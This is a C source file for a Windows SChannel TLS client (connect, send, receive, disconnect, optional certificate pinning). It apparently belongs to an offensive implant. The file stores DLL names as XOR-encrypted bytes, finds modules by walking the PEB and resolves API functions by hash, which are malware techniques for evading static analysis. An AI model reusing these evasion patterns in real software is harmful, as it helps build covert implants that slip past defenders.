#include "schannel.h"

#ifdef _WIN32

#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif
#include <windows.h>
#include <sspi.h>
#include <schannel.h>

#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include "bcrypt_peb.h"
#include <wincrypt.h>

/* ── SChannel constants (guard against mingw redefines) ─────────── */

#ifndef SEC_E_OK
#define SEC_E_OK                0x00000000L
#endif
#ifndef SEC_I_CONTINUE_NEEDED
#define SEC_I_CONTINUE_NEEDED   0x00090312L
#endif
#ifndef SEC_I_INCOMPLETE_CREDS
#define SEC_I_INCOMPLETE_CREDS  0x00090320L
#endif
#ifndef SEC_E_INCOMPLETE_MSG
#define SEC_E_INCOMPLETE_MSG    ((HRESULT)0x80090318L)
#endif
#ifndef SECPKG_CRED_OUTBOUND
#define SECPKG_CRED_OUTBOUND    0x00000002UL
#endif
#ifndef ISC_REQ_STREAM
#define ISC_REQ_STREAM          0x00008000UL
#endif
#ifndef ISC_REQ_ALLOCATE_MEMORY
#define ISC_REQ_ALLOCATE_MEMORY 0x00000100UL
#endif
#ifndef SCH_CRED_VERSION
#define SCH_CRED_VERSION        4UL
#endif
#ifndef SECPKG_ATTR_STREAM_SIZES
#define SECPKG_ATTR_STREAM_SIZES 0x0AUL
#endif
#ifndef SECBUFFER_EMPTY
#define SECBUFFER_EMPTY         0UL
#endif
#ifndef SECBUFFER_DATA
#define SECBUFFER_DATA          1UL
#endif
#ifndef SECBUFFER_TOKEN
#define SECBUFFER_TOKEN         2UL
#endif
#ifndef SECBUFFER_EXTRA
#define SECBUFFER_EXTRA         5UL
#endif
#ifndef SECBUFFER_STREAM_HEADER
#define SECBUFFER_STREAM_HEADER 7UL
#endif
#ifndef SECBUFFER_STREAM_TRAILER
#define SECBUFFER_STREAM_TRAILER 6UL
#endif

/* ── types ─────────────────────────────────────────────────────── */

/* SecPkgContext_StreamSizes and SCHANNEL_CRED are defined in Windows headers */

/* ── XOR-encrypted strings (no plaintext in .rdata) ─────────────── */

static const uint8_t enc_secur32_dll[] = {
    0x3c,0x08,0x06,0x12,0x13,0x13,0x61,0x5a,0x01,0x0d,0x00
};
#define SECUR32_DLL_LEN 11

static HMODULE g_secur32 = NULL;
static int g_sec_loaded = 0;

/* Function pointer types for secur32 exports */

typedef SECURITY_STATUS (WINAPI *pAcquireCredA)(
    PCSTR, PCSTR, ULONG, PVOID, PVOID,
    PVOID, PVOID, PCredHandle, PTimeStamp);

typedef SECURITY_STATUS (WINAPI *pInitSecCtxA)(
    PCredHandle, PCtxtHandle, PCSTR, ULONG, ULONG,
    ULONG, PSecBufferDesc, ULONG, PCtxtHandle,
    PSecBufferDesc, PULONG, PTimeStamp);

typedef SECURITY_STATUS (WINAPI *pEncryptMsg)(
    PCtxtHandle, ULONG, PSecBufferDesc, ULONG);

typedef SECURITY_STATUS (WINAPI *pDecryptMsg)(
    PCtxtHandle, PSecBufferDesc, ULONG, PULONG);

typedef SECURITY_STATUS (WINAPI *pFreeCredHandle)(PCredHandle);
typedef SECURITY_STATUS (WINAPI *pDeleteSecCtx)(PCtxtHandle);
typedef SECURITY_STATUS (WINAPI *pFreeCtxBuffer)(PVOID);
typedef SECURITY_STATUS (WINAPI *pQueryCtxAttrA)(PCtxtHandle, ULONG, PVOID);

static pAcquireCredA    fn_Acquire    = NULL;
static pInitSecCtxA     fn_InitSec    = NULL;
static pEncryptMsg      fn_Encrypt    = NULL;
static pDecryptMsg      fn_Decrypt    = NULL;
static pFreeCredHandle  fn_FreeCred   = NULL;
static pDeleteSecCtx    fn_DeleteCtx  = NULL;
static pFreeCtxBuffer   fn_FreeBuf    = NULL;
static pQueryCtxAttrA   fn_QueryAttr  = NULL;

/* Resolve function by XOR-encrypted hash (27 iters, exact case) */
static void* resolve_fn(void* mod, uint32_t hash) {
    return mirage_get_function_by_hash(mod, hash);
}

static int sec_ensure_loaded(void) {
    if (g_sec_loaded) return 1;

    /* Try PEB walk first — secur32.dll may already be loaded */
    uint8_t tmp[SECUR32_DLL_LEN];
    mirage_xor_decrypt(enc_secur32_dll, tmp, SECUR32_DLL_LEN);
    uint32_t mod_hash = mirage_encrypted_hash_module((const char*)tmp);
    g_secur32 = (HMODULE)mirage_get_module_by_hash(mod_hash);

    /* Fallback: load via encrypted string */
    if (!g_secur32) {
        typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
        char k32_dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, k32_dll);
        uint32_t k32_hash = mirage_encrypted_hash_module(k32_dll);
        void* k32 = mirage_get_module_by_hash(k32_hash);
        if (!k32) return 0;
        char ll_fn[32]; enc_decrypt(enc_LoadLibraryA, ENC_LOADLIBRARYA_LEN, ll_fn);
        pLoadLibraryA fnLoad = (pLoadLibraryA)resolve_fn(k32,
            mirage_encrypted_hash_func(ll_fn));
        if (!fnLoad) return 0;
        g_secur32 = fnLoad((const char*)tmp);
        if (!g_secur32) return 0;
    }

    /* Resolve all 8 exports by hash */
    fn_Acquire   = (pAcquireCredA)   resolve_fn(g_secur32, 0xBFF60A9Bu); /* AcquireCredentialsHandleA */
    fn_InitSec   = (pInitSecCtxA)    resolve_fn(g_secur32, 0x1F8FADE7u); /* InitializeSecurityContextA */
    fn_Encrypt   = (pEncryptMsg)     resolve_fn(g_secur32, 0xEA9275EFu); /* EncryptMessage */
    fn_Decrypt   = (pDecryptMsg)     resolve_fn(g_secur32, 0x124EDDF4u); /* DecryptMessage */
    fn_FreeCred  = (pFreeCredHandle) resolve_fn(g_secur32, 0x07765BA3u); /* FreeCredentialsHandle */
    fn_DeleteCtx = (pDeleteSecCtx)   resolve_fn(g_secur32, 0x37E86A76u); /* DeleteSecurityContext */
    fn_FreeBuf   = (pFreeCtxBuffer)  resolve_fn(g_secur32, 0x3A352AD6u); /* FreeContextBuffer */
    fn_QueryAttr = (pQueryCtxAttrA)  resolve_fn(g_secur32, 0x4A0B10E0u); /* QueryContextAttributesA */

    if (!fn_Acquire || !fn_InitSec || !fn_Encrypt || !fn_Decrypt ||
        !fn_FreeCred || !fn_DeleteCtx || !fn_FreeBuf || !fn_QueryAttr)
        return 0;

    g_sec_loaded = 1;
    return 1;
}

/* ── helpers ───────────────────────────────────────────────────── */

static void copy_to_wide(char *dst, size_t dst_cap, const char *src) {
    size_t i;
    for (i = 0; src[i] && (i * 2 + 2) < dst_cap; ++i) {
        dst[i * 2]     = src[i];
        dst[i * 2 + 1] = 0;
    }
    dst[i * 2]     = 0;
    dst[i * 2 + 1] = 0;
}

/* ── public API ────────────────────────────────────────────────── */

tls_result_t tls_connect(tls_context_t *ctx, HANDLE sock, const char *hostname) {
    if (!sec_ensure_loaded()) return TLS_ERR_CRED_FAILED;

    /* acquire credentials - use AcquireCredentialsHandleA directly */
    CredHandle cred = {0, 0};
    TimeStamp  expiry;
    CtxtHandle  ctxt = {0, 0};

    SECURITY_STATUS ss = fn_Acquire(
        NULL, "UNISP_NAME_A", SECPKG_CRED_OUTBOUND,
        NULL, NULL, NULL, NULL, &cred, &expiry);
    if (ss != SEC_E_OK) return TLS_ERR_CRED_FAILED;

    /* hostname as wide string */
    char host_wide[512];
    copy_to_wide(host_wide, sizeof(host_wide), hostname);

    /* handshake loop */
    int first = 1;
    unsigned char in_buf[0x4000];
    ULONG in_len = 0;

    for (;;) {
        SecBuffer out_buf;
        out_buf.BufferType = SECBUFFER_TOKEN;
        out_buf.cbBuffer   = 0;
        out_buf.pvBuffer   = NULL;

        SecBufferDesc out_desc;
        out_desc.ulVersion = 0;
        out_desc.cBuffers  = 1;
        out_desc.pBuffers  = &out_buf;

        SecBufferDesc *in_desc_ptr = NULL;
        SecBufferDesc  in_desc;
        SecBuffer      in_bufs[2];

        if (!first) {
            in_bufs[0].BufferType = SECBUFFER_TOKEN;
            in_bufs[0].cbBuffer   = in_len;
            in_bufs[0].pvBuffer   = in_buf;
            in_bufs[1].BufferType = SECBUFFER_EMPTY;
            in_bufs[1].cbBuffer   = 0;
            in_bufs[1].pvBuffer   = NULL;

            in_desc.ulVersion = 0;
            in_desc.cBuffers  = 2;
            in_desc.pBuffers  = in_bufs;
            in_desc_ptr = &in_desc;
        }

        ULONG attrs = 0;
        TimeStamp new_ts;

        ss = fn_InitSec(
            &cred,
            first ? NULL : &ctxt,
            host_wide,
            ISC_REQ_STREAM | ISC_REQ_ALLOCATE_MEMORY,
            0, 0,
            in_desc_ptr,
            0,
            &ctxt,
            &out_desc,
            &attrs,
            &new_ts);

        first = 0;

        /* send token if produced */
        if (out_buf.cbBuffer > 0 && out_buf.pvBuffer) {
            size_t sent;
            ws2_send(sock, (uint8_t *)out_buf.pvBuffer, out_buf.cbBuffer, &sent);
            fn_FreeBuf(out_buf.pvBuffer);
        }

        if (ss == SEC_E_OK) {
            break;
        } else if (ss == SEC_I_CONTINUE_NEEDED || ss == SEC_I_INCOMPLETE_CREDS) {
            size_t n;
            ws2_result_t r = ws2_recv(sock, in_buf, sizeof(in_buf), &n);
            if (r != WS2_OK || n == 0) {
                fn_DeleteCtx(&ctxt);
                fn_FreeCred(&cred);
                return TLS_ERR_HANDSHAKE_FAILED;
            }
            in_len = (ULONG)n;
        } else {
            fn_DeleteCtx(&ctxt);
            fn_FreeCred(&cred);
            return TLS_ERR_HANDSHAKE_FAILED;
        }
    }

#ifdef CERT_PINNING_ENABLED
    /* Certificate pinning: SHA-256 hash of server cert, compared to CERT_PIN_HASH */
    {
#ifndef SECPKG_ATTR_REMOTE_CERT_CONTEXT
#define SECPKG_ATTR_REMOTE_CERT_CONTEXT 0x53UL
#endif
        PCCERT_CONTEXT remote_cert = NULL;
        SECURITY_STATUS pin_ss = fn_QueryAttr(&ctxt, SECPKG_ATTR_REMOTE_CERT_CONTEXT, &remote_cert);
        if (pin_ss == SEC_E_OK && remote_cert && remote_cert->pbCertEncoded && remote_cert->cbCertEncoded > 0) {
            const bcrypt_api_t *bc = mirage_bcrypt_api();
            if (bc && bc->ready) {
                BCRYPT_ALG_HANDLE hAlg = NULL;
                BCRYPT_HASH_HANDLE hHash = NULL;
                static const UCHAR sha256_oid[] = BCRYPT_SHA256_ALGORITHM;
                if (bc->pOpen(&hAlg, (LPCWSTR)sha256_oid, NULL, 0) == 0) {
                    if (bc->pCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) == 0) {
                        bc->pHashData(hHash, remote_cert->pbCertEncoded, remote_cert->cbCertEncoded, 0);
                        UCHAR hash[32];
                        bc->pFinishHash(hHash, hash, 32, 0);
                        bc->pDestroyHash(hHash);

                        /* Compare against expected pin */
                        static const UCHAR expected_pin[32] = CERT_PIN_HASH;
                        if (memcmp(hash, expected_pin, 32) != 0) {
                            bc->pClose(hAlg, 0);
                            CertFreeCertificateContext(remote_cert);
                            fn_DeleteCtx(&ctxt);
                            fn_FreeCred(&cred);
                            return TLS_ERR_PIN_FAILED;
                        }
                    }
                    bc->pClose(hAlg, 0);
                }
            }
            CertFreeCertificateContext(remote_cert);
        }
    }
#endif /* CERT_PINNING_ENABLED */

    /* query stream sizes */
    SecPkgContext_StreamSizes sizes;
    ss = fn_QueryAttr(&ctxt, SECPKG_ATTR_STREAM_SIZES, &sizes);
    if (ss != SEC_E_OK) {
        fn_DeleteCtx(&ctxt);
        fn_FreeCred(&cred);
        return TLS_ERR_STREAM_SIZES;
    }

    ctx->sock         = sock;
    ctx->cred_lower   = cred.dwLower;
    ctx->cred_upper   = cred.dwUpper;
    ctx->ctx_lower    = ctxt.dwLower;
    ctx->ctx_upper    = ctxt.dwUpper;
    ctx->header_size  = sizes.cbHeader;
    ctx->trailer_size = sizes.cbTrailer;
    ctx->max_message  = sizes.cbMaximumMessage;
    ctx->connected    = 1;
    return TLS_OK;
}

tls_result_t tls_send(tls_context_t *ctx, const uint8_t *data, size_t len, size_t *out_sent) {
    if (!sec_ensure_loaded()) return TLS_ERR_ENCRYPT_FAILED;

    CtxtHandle ctxt = {ctx->ctx_lower,  ctx->ctx_upper};

    uint32_t hdr  = ctx->header_size;
    uint32_t trl  = ctx->trailer_size;
    uint32_t maxm = ctx->max_message;
    size_t total = 0;

    /* TLS record max 16KB — buffer holds header+payload+trailer */
    unsigned char msg[0x4000];

    while (total < len) {
        size_t chunk = len - total;
        if (chunk > maxm) chunk = maxm;
        /* ponytail: clamp so frame never exceeds buffer */
        if (hdr + chunk + trl > sizeof(msg)) chunk = sizeof(msg) - hdr - trl;

        size_t frame_len = hdr + chunk + trl;
        memset(msg, 0, frame_len);
        memcpy(msg + hdr, data + total, chunk);

        SecBuffer bufs[4];
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
        bufs[0].cbBuffer   = hdr;
        bufs[0].pvBuffer   = msg;

        bufs[1].BufferType = SECBUFFER_DATA;
        bufs[1].cbBuffer   = (ULONG)chunk;
        bufs[1].pvBuffer   = msg + hdr;

        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
        bufs[2].cbBuffer   = trl;
        bufs[2].pvBuffer   = msg + hdr + chunk;

        bufs[3].BufferType = SECBUFFER_EMPTY;
        bufs[3].cbBuffer   = 0;
        bufs[3].pvBuffer   = NULL;

        SecBufferDesc desc;
        desc.ulVersion = 0;
        desc.cBuffers  = 4;
        desc.pBuffers  = bufs;

        SECURITY_STATUS es = fn_Encrypt(&ctxt, 0, &desc, 0);
        if (es != SEC_E_OK) return TLS_ERR_ENCRYPT_FAILED;

        /* compute total frame size (header + data + trailer) */
        size_t total_frame = 0;
        for (int i = 0; i < 3; ++i) {
            if (bufs[i].BufferType == SECBUFFER_STREAM_HEADER ||
                bufs[i].BufferType == SECBUFFER_DATA ||
                bufs[i].BufferType == SECBUFFER_STREAM_TRAILER) {
                total_frame += bufs[i].cbBuffer;
            }
        }

        size_t sent;
        ws2_result_t r = ws2_send(ctx->sock, msg, total_frame, &sent);
        if (r != WS2_OK) return TLS_ERR_ENCRYPT_FAILED;

        total += chunk;
    }

    if (out_sent) *out_sent = total;
    return TLS_OK;
}

tls_result_t tls_recv(tls_context_t *ctx, uint8_t *buf, size_t buf_len, size_t *out_read) {
    if (!sec_ensure_loaded()) return TLS_ERR_DECRYPT_FAILED;

    CtxtHandle ctxt = {ctx->ctx_lower,  ctx->ctx_upper};

    /* TLS record max 16KB */
    unsigned char recv_buf[0x4000];
    size_t recv_len = 0;

    for (;;) {
        size_t n;
        ws2_result_t r = ws2_recv(ctx->sock, recv_buf + recv_len,
                                  sizeof(recv_buf) - recv_len, &n);
        if (r != WS2_OK) return TLS_ERR_DECRYPT_FAILED;
        if (n == 0 && recv_len == 0) { if (out_read) *out_read = 0; return TLS_OK; }
        recv_len += n;

        /* bounds: a valid TLS record should never exceed 16KB+overhead */
        if (recv_len > sizeof(recv_buf)) { if (out_read) *out_read = 0; return TLS_ERR_DECRYPT_FAILED; }

        SecBuffer bufs[4];
        bufs[0].BufferType = SECBUFFER_DATA;
        bufs[0].cbBuffer   = (ULONG)recv_len;
        bufs[0].pvBuffer   = recv_buf;
        for (int i = 1; i < 4; ++i) {
            bufs[i].BufferType = SECBUFFER_EMPTY;
            bufs[i].cbBuffer   = 0;
            bufs[i].pvBuffer   = NULL;
        }

        SecBufferDesc desc;
        desc.ulVersion = 0;
        desc.cBuffers  = 4;
        desc.pBuffers  = bufs;

        SECURITY_STATUS ds = fn_Decrypt(&ctxt, &desc, 0, NULL);

        if (ds == SEC_E_INCOMPLETE_MSG) continue;
        if (ds != SEC_E_OK) return TLS_ERR_DECRYPT_FAILED;

        /* extract DATA and EXTRA buffers */
        void *data_ptr = NULL;  ULONG data_len = 0;
        void *extra_ptr = NULL; ULONG extra_len = 0;

        for (int i = 0; i < 4; ++i) {
            if (bufs[i].BufferType == SECBUFFER_DATA) {
                data_ptr = bufs[i].pvBuffer;
                data_len = bufs[i].cbBuffer;
            } else if (bufs[i].BufferType == SECBUFFER_EXTRA) {
                extra_ptr = bufs[i].pvBuffer;
                extra_len = bufs[i].cbBuffer;
            }
        }

        if (data_ptr && data_len > 0) {
            /* bounds: decrypted payload must not exceed TLS record max */
            if (data_len > 0x4000) return TLS_ERR_DECRYPT_FAILED;
            size_t to_copy = buf_len < data_len ? buf_len : data_len;
            memcpy(buf, data_ptr, to_copy);

            if (extra_len > 0 && extra_ptr) {
                /* carry extra data into next iteration */
                memmove(recv_buf, extra_ptr, extra_len);
                recv_len = extra_len;
            } else {
                recv_len = 0;
            }

            if (out_read) *out_read = to_copy;
            return TLS_OK;
        }

        recv_len = 0;
    }
}

void tls_disconnect(tls_context_t *ctx) {
    if (!ctx->connected) return;
    if (!sec_ensure_loaded()) { memset(ctx, 0, sizeof(*ctx)); return; }
    CredHandle cred = {ctx->cred_lower, ctx->cred_upper};
    CtxtHandle ctxt = {ctx->ctx_lower,  ctx->ctx_upper};
    fn_DeleteCtx(&ctxt);
    fn_FreeCred(&cred);
    memset(ctx, 0, sizeof(*ctx));
}

#else /* POSIX stub ──────────────────────────────────────────────── */

tls_result_t tls_connect(tls_context_t *ctx, HANDLE sock, const char *hostname) {
    (void)ctx; (void)sock; (void)hostname;
    return TLS_ERR_CRED_FAILED;
}

tls_result_t tls_send(tls_context_t *ctx, const uint8_t *data, size_t len, size_t *out_sent) {
    (void)ctx; (void)data; (void)len;
    if (out_sent) *out_sent = 0;
    return TLS_ERR_ENCRYPT_FAILED;
}

tls_result_t tls_recv(tls_context_t *ctx, uint8_t *buf, size_t buf_len, size_t *out_read) {
    (void)ctx; (void)buf; (void)buf_len;
    if (out_read) *out_read = 0;
    return TLS_ERR_DECRYPT_FAILED;
}

void tls_disconnect(tls_context_t *ctx) { (void)ctx; }

#endif /* _WIN32 */
